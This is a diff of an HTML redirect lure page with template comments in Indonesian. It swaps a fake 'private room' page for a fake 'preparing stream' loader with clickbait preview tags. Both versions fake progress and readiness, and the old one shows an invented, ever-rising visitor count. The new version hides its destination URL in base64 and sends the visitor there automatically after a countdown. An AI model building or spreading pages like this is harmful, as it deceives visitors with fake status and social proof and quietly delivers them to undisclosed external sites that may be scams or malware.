@@ -1,210 +1,182 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Private Room</title>
+<meta charset="UTF-8">
 
-  <!-- ================= OG PREVIEW ================= -->
+<!-- ================== EDIT BAGIAN INI ================== -->
 
-  <!-- GANTI GAMBAR PREVIEW DI SINI -->
-  <!-- contoh: https://domainlu.com/image.jpg -->
-  <meta property="og:image" content="https://raw.githubusercontent.com/kokondaua-lgtm/Galery-interface/refs/heads/main/preview.jpg">
+<meta property="og:url" content="https://loading-view.vercel.app/">
+<meta property="og:title" content="🎁 SOMETHING UNEXPECTED IS WAITING">
+<meta property="og:description" content="Tap to watch the latest live content.">
+<meta property="og:image" content="https://i.imgur.com/eYbBuux.jpeg">
 
-  <!-- GANTI JUDUL -->
-  <meta property="og:title" content="🔒 Lovely Room Access">
+<meta property="og:site_name" content="Live Access">
+<meta property="og:type" content="website">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- GANTI DESKRIPSI -->
-  <meta property="og:description" content="Limited access • Tap to enter">
+<title>Loading...</title>
 
-  <!-- JANGAN DIUBAH -->
-  <meta property="og:url" content="/">
-  <meta property="og:type" content="website">
+<!-- ===================================================== -->
 
-  <!-- ============================================ -->
+<style>
+body {
+  margin: 0;
+  background: #0b0b0b;
+  color: white;
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+/* CARD UI */
+.card {
+  width: 90%;
+  max-width: 340px;
+  background: #111;
+  border-radius: 18px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 0 25px rgba(0,0,0,0.6);
+}
 
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial;
-      background: #000;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
+/* LOADER */
+.loader {
+  width: 70px;
+  height: 70px;
+  border: 6px solid #333;
+  border-top: 6px solid #00ffcc;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px;
+}
 
-    .box {
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
 
-    .title {
-      font-size: 22px;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
+h2 {
+  font-size: 20px;
+  margin-bottom: 10px;
+}
 
-    .status {
-      font-size: 14px;
-      opacity: 0.7;
-      margin-bottom: 20px;
-    }
+p {
+  font-size: 13px;
+  opacity: 0.7;
+}
 
-    .progress {
-      width: 100%;
-      height: 8px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 10px;
-      overflow: hidden;
-      margin-bottom: 15px;
-    }
+/* PROGRESS */
+.bar {
+  height: 6px;
+  background: #222;
+  border-radius: 10px;
+  overflow: hidden;
+  margin: 15px 0;
+}
 
-    .bar {
-      width: 0%;
-      height: 100%;
-      background: #ff004f;
-      transition: 0.3s;
-    }
+.fill {
+  height: 100%;
+  width: 0%;
+  background: #00ffcc;
+  transition: 0.3s;
+}
 
-    .people {
-      font-size: 12px;
-      opacity: 0.7;
-      margin-bottom: 20px;
-    }
+/* BUTTON */
+.btn {
+  margin-top: 15px;
+  background: #00ffcc;
+  color: black;
+  border: none;
+  padding: 12px;
+  width: 100%;
+  border-radius: 12px;
+  font-weight: bold;
+  font-size: 15px;
+  cursor: pointer;
+}
 
-    .loader {
-      border: 4px solid rgba(255,255,255,0.1);
-      border-top: 4px solid #ff004f;
-      border-radius: 50%;
-      width: 45px;
-      height: 45px;
-      margin: auto;
-      animation: spin 1s linear infinite;
-    }
+.btn:active {
+  transform: scale(0.96);
+}
 
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
-    }
-
-    .btn {
-      margin-top: 25px;
-      width: 100%;
-      padding: 14px;
-      border-radius: 30px;
-      background: #ff004f;
-      border: none;
-      color: #fff;
-      font-size: 16px;
-      font-weight: bold;
-      display: none;
-    }
-
-    .hint {
-      font-size: 12px;
-      opacity: 0.6;
-      margin-top: 10px;
-    }
-  </style>
+.countdown {
+  margin-top: 10px;
+  font-size: 13px;
+  opacity: 0.6;
+}
+</style>
 </head>
 
 <body>
 
-<div class="box">
+<div class="card">
 
-  <div class="title">🔒 Love Interface Room</div>
-  <div class="status" id="status">Connecting...</div>
+  <div class="loader"></div>
 
-  <div class="progress">
-    <div class="bar" id="bar"></div>
+  <h2 id="status">Preparing stream...</h2>
+
+  <div class="bar">
+    <div class="fill" id="progress"></div>
   </div>
 
-  <div class="people" id="people"></div>
+  <button class="btn" onclick="goNow()">▶ Continue</button>
 
-  <div class="loader" id="loader"></div>
-
-  <!-- CTA SUDAH DIGANTI -->
-  <button class="btn" id="btn" onclick="goLink()">Enter Now 🔥</button>
-
-  <div class="hint">Limited slots available</div>
+  <div class="countdown">
+    Auto opening in <span id="time">5</span>s...
+  </div>
 
 </div>
 
 <script>
 
-  /* ================= GANTI LINK DI SINI ================= */
-  const link = "https://dffjhfg.lnkks.com/p/oRqSU";
-  /* ===================================================== */
+// ================== EDIT LINK DISINI ==================
+let encoded = "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk=";
+let target = atob(encoded);
+// =====================================================
 
-  function goLink() {
-    window.location.href = link;
+let progress = 0;
+let timeLeft = 5;
+
+let bar = document.getElementById("progress");
+let status = document.getElementById("status");
+let timeText = document.getElementById("time");
+
+// PROGRESS ANIMATION
+let prog = setInterval(() => {
+  progress += Math.random() * 20;
+  if (progress > 100) progress = 100;
+
+  bar.style.width = progress + "%";
+
+  if (progress < 40) {
+    status.innerText = "Preparing stream...";
+  } else if (progress < 80) {
+    status.innerText = "Connecting...";
+  } else {
+    status.innerText = "Almost ready...";
   }
 
-  const lang = navigator.language || "en";
+  if (progress >= 100) clearInterval(prog);
 
-  let text = {
-    connecting: "Connecting...",
-    verifying: "Verifying access...",
-    ready: "Private room ready",
-    people: "people entering"
-  };
+}, 400);
 
-  if (lang.includes("id")) {
-    text = {
-      connecting: "Menghubungkan...",
-      verifying: "Memverifikasi akses...",
-      ready: "Room siap diakses",
-      people: "orang sedang masuk"
-    };
+// COUNTDOWN
+let timer = setInterval(() => {
+  timeLeft--;
+  timeText.innerText = timeLeft;
+
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    window.location.href = target;
   }
 
-  const status = document.getElementById("status");
-  const bar = document.getElementById("bar");
-  const people = document.getElementById("people");
+}, 1000);
 
-  /* ================= EDIT RAMAI / SEPI ================= */
-  let count = Math.floor(Math.random()*300)+250;
-  /* ==================================================== */
-
-  function updatePeople(){
-    count += Math.floor(Math.random()*5)+2;
-    people.innerText = count + " " + text.people;
-  }
-
-  setInterval(updatePeople, 600);
-  updatePeople();
-
-  let progress = 0;
-
-  const interval = setInterval(() => {
-    progress += Math.random()*15;
-    if(progress > 100) progress = 100;
-
-    bar.style.width = progress + "%";
-
-    if(progress < 40){
-      status.innerText = text.connecting;
-    } else if(progress < 80){
-      status.innerText = text.verifying;
-    } else {
-      status.innerText = text.ready;
-    }
-
-    if(progress === 100){
-      clearInterval(interval);
-
-      document.getElementById("loader").style.display = "none";
-      document.getElementById("btn").style.display = "block";
-
-      /* ===== AUTO REDIRECT (OPTIONAL) ===== */
-      setTimeout(()=>{
-        goLink();
-      }, 600); // GANTI DELAY DI SINI / HAPUS KALO MAU MANUAL
-    }
-
-  }, 200);
+// BUTTON CLICK
+function goNow(){
+  window.location.href = target;
+}
 
 </script>
 
